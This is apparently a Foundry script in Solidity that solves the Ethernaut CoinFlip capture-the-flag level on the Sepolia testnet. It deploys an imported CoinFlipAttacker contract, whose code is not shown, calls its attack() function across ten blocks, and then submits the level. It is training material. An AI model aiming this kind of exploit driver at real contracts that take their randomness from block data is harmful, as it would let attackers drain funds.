// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {CoinFlipAttacker} from "../../src/03-CoinFlipAttacker.sol";
import {CoinFlip} from "../../challenge-contracts/03-CoinFlip.sol";

contract CoinFlipSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
    address challengeInstanceOnChain = 0x34B9c686b046fbee041A1dBFfCe6c6Ea522DE330; // Change this address into yours after step1 executed.
    address coinFlipAttackerAddress = 0x160bd70a3a8B4528E0295d1950F50D57c2b8C2A5; // Change this address into yours after step1 executed.

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        CoinFlip coinFlip = CoinFlip(challengeInstance);
        // YOUR SOLUTION HERE 

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(3));
    }

    /**
     * Execute 1 time.
     * Deployed challengeInstance and coinFlipAttacker contracts on Sepolia, then executed attack() function once.
     * Ex. forge script ... ... --sig "step1()" --broadcast
     */
    function step1() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);
        console2.log("challengeInstanceOnChain:", challengeInstance);

        // YOUR SOLUTION HERE 
        CoinFlipAttacker coinFlipAttacker = new CoinFlipAttacker(challengeInstance);
        coinFlipAttacker.attack();
        console2.log("coinFlipAttackerAddress:", address(coinFlipAttacker));
        vm.stopBroadcast();
    }

    /**
     * Execute 9 times.
     * Executed attack() function.
     * Ex. forge script ... ... --sig "step2()" --broadcast
     */
    function step2() public {
        vm.startBroadcast(heroPrivateKey);

        CoinFlipAttacker(coinFlipAttackerAddress).attack();
        console2.log("block.number:", block.number);
        console2.log("consecutiveWins:", CoinFlip(challengeInstanceOnChain).consecutiveWins());
        vm.stopBroadcast();
    }

    /**
     * Execute 1 time.
     * Submitted challengeInstance.
     * Ex. forge script ... ... --sig "step3()" --broadcast
     */
    function step3() public {
        vm.startBroadcast(heroPrivateKey);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstanceOnChain);
        require(levelSuccess, "Challenge not passed yet");

        vm.stopBroadcast();

        console2.log(successMessage(3));
    }
}
